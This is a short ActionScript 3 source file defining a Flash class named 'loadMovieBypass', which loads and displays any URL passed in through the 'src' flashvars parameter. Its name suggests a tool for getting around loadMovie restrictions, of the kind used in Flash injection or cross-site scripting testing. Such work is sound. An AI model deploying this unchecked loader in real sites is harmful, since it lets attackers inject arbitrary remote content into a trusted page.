package
{
    import flash.display.*;
    import flash.external.*;
    import flash.system.System;
import flash.net.*;
    public class loadMovieBypass extends Sprite
    {
        public function loadMovieBypass()
        {
          var request:URLRequest = new URLRequest(LoaderInfo(this.root.loaderInfo).parameters.src.toString()); 
var loader:Loader = new Loader() 
loader.load(request); 
addChild(loader);
        }
    }
}
